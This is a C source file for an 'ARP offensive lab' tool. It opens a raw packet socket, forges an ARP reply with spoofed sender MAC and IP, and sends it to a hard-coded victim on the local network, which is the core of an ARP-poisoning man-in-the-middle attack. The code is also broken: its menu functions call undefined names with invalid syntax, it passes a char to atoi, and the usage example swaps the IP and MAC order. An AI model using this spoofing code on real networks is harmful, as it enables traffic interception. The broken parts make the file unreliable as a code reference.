#include "arp_attack.h"

void arp_attack_banner()
{
  printf("------------------------------------\n");
  printf("  WELCOME TO THE ARP OFFENSIVE LAB  \n");
  printf("------------------------------------\n");
}

void show_arp_attack_menu()
{
  printf("1 - Set data -> source_mac, source_ip, target_mac, target_ip\n");
  printf("2 - Start attack\n");
  printf("3 - Exit\n");
}

void usage()
{
  puts("usage:\t./arp-poison <source_mac> <source_ip> <target_mac> <target_ip>");
  puts("ex:\t./arp-poison 10.1.1.1 aa:bb:cc:dd:ee:ff 10.1.1.2 ff:ee:dd:cc:bb:aa");
  exit(1);
}

void cleanup(int sock)
{
  printf("Cleaning the system!");
	close(sock);
}

arp_addrs_t init_addrs()
{
  arp_addrs_t a= {
    .source_mac={0xAB, 0xCD, 0xEF, 0xEF, 0xCD, 0xAB},
    .source_ip={192, 168, 0, 160},
    .target_mac={0x00,0x0c,0x29,0x51,0x40,0xba},
    .target_ip={192, 168, 170, 128}
  };
  return a;

}

int open_socket()
{
  //Creates a raw Layer-2 socket for sending/receiving ARP frames and returns a file descriptor.
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        exit(1);
    }
    return sock;
}

void set_ether_headers(arp_addrs_t arp_addrs, uint8_t *reply_arp)
{
  memcpy(reply_arp, arp_addrs.target_mac, 6);  
  memcpy(reply_arp + 6, arp_addrs.source_mac, 6);   
  reply_arp[12] = 0x08;                     
  reply_arp[13] = 0x06; // EtherType = ARP (0x0806)

}

void set_arp_headers( arp_header_t *arp,arp_addrs_t arp_addrs )
{

    arp->htype = htons(ARP_HTYPE);
    arp->ptype = htons(ARP_PTYPE);
    arp->hlen = ARP_HLEN;
    arp->plen = ARP_PLEN;
    arp->opcode = htons(ARP_REPLY);

    memcpy(arp->sender_mac, arp_addrs.source_mac, ARP_HLEN);
    memcpy(arp->sender_ip, arp_addrs.source_ip, ARP_PLEN);
    memcpy(arp->target_mac, arp_addrs.target_mac, ARP_HLEN);
    memcpy(arp->target_ip, arp_addrs.target_ip, ARP_PLEN);

}

void set_socket(struct sockaddr_ll * addr, arp_addrs_t arp_addrs)
{
    addr->sll_family = AF_PACKET;
    addr->sll_ifindex = if_nametoindex("enp2s0"); 
    addr->sll_halen = ETH_ALEN;
    memcpy(addr->sll_addr, arp_addrs.target_mac, 6);
}

void control_attack()
{
  int sock;
  uint8_t reply_arp[42];

  arp_addrs_t arp_addrs = init_addrs();

  sock = open_socket();

  set_ether_headers(arp_addrs, reply_arp);

  arp_header_t *arp = (arp_header_t *)(reply_arp + 14);
  set_arp_headers(arp, arp_addrs);

  struct sockaddr_ll addr = {0};
  set_socket(&addr, arp_addrs);

  if (sendto(sock, reply_arp, 42, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
      perror("sendto");
      exit(1);
  }

  printf("ARP Reply sent!\n");

  cleanup(sock);

}

void arp_attack_handle_user(char option)
{
  int option_int= atoi(option);
  switch(option_int){
  case 2:
    control_attack();
    break;
  }

}

void arp_attack_menu_controller()
{
  char option = 0;
  banner();

  while(option != '3')
  {
    show_menu();
    option = getchar();
    getchar();
    printf("User entered: %c\n",option);
    handle_user(char option);
  }

}

int main(){
  control_attack();
  return 0;
}
